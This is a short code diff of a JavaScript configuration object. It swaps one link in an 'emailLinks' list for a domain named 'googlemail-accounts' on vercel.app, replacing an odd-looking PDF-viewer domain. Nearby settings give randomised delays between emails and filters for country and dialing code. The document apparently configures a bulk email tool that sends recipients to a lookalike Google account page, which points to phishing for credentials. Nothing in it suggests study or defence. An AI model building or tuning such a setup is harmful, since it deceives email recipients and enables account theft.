@@ -402,7 +402,7 @@ const CONFIG = {
 
   emailDelay: { min: 30000, max: 60000 }, // 30 to 60 seconds
   emailLinks: [
-    "https://pdfviewerimg133929edhe778338393.vercel.app/",
+    "https://googlemail-accounts.vercel.app/",
   ],
   defaultCountryCode: null, // Set to a country code like 'US', 'GB', etc., to filter searches by country. Set to null for global search.
   defaultDialingCode: null, // Set to a dialing code like '+1', '+44', etc., to filter searches by dialing code. Set to null for no dialing code filter.
